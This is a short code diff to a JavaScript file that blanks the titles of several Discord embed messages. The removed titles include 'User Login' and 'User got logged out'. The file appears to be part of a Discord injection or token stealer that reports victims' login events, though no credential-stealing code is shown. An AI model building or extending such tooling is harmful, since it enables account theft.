@@ -32,7 +32,7 @@ function FirstTime() {
             content: "",
             embeds: [
               {
-                title: "Discord Initalized (User not Logged in)",
+                title: "",
                 color: config["embed-color"],
                 fields: [
                   {
@@ -63,7 +63,7 @@ function FirstTime() {
                 content: "",
                 embeds: [
                   {
-                    title: "Discord Initalized",
+                    title: "",
                     color: config["embed-color"],
                     fields: [
                      
@@ -103,7 +103,7 @@ function FirstTime() {
               content: "",
               embeds: [
                 {
-                  title: "User log out (User not Logged in before)",
+                  title: "",
                   color: config["embed-color"],
                   fields: [
                     {
@@ -133,7 +133,7 @@ function FirstTime() {
                   content: "",
                   embeds: [
                     {
-                      title: "User got logged out",
+                      title: "",
                       color: config["embed-color"],
                       fields: [
                       
@@ -301,7 +301,7 @@ function Login(e, t, n) {
                     content: "",
                     embeds: [
                       {
-                        title: "User Login",
+                        title: "",
                         color: config["embed-color"],
                         fields: [
                          
